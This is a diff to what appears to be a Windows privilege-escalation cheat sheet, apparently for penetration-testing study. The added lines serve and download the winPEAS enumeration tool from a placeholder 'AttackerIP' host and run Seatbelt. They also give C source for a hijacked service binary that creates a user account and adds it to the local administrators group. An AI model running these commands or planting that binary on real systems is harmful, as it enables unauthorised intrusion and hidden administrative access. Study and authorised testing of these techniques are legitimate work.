@@ -76,3 +76,39 @@ Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction Si
 ```
 Get-History
 (Get-PSReadlineOption).HistorySavePath
+```
+
+### WinPeas (Seatbelt, JAWS)
+
+```
+cd /usr/share/peass/winpeas/winPEASx64.exe
+python3 -m http.server 8088
+iwr -uri http://AttackerIP/winPEASx64.exe -Outfile winPEAS.exe
+
+seatbelt.exe -group=all
+```
+Tools:
+- https://github.com/carlospolop/PEASS-ng
+- https://github.com/GhostPack/Seatbelt
+- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
+- https://github.com/Marshall-Hallenbeck/compiled_binaries
+- https://github.com/411Hall/JAWS
+
+## Services
+
+### Hijacking
+
+```
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user someuser somepass /add");
+  i = system ("net localgroup administrators someuser /add");
+  
+  return 0;
+}
+```
+
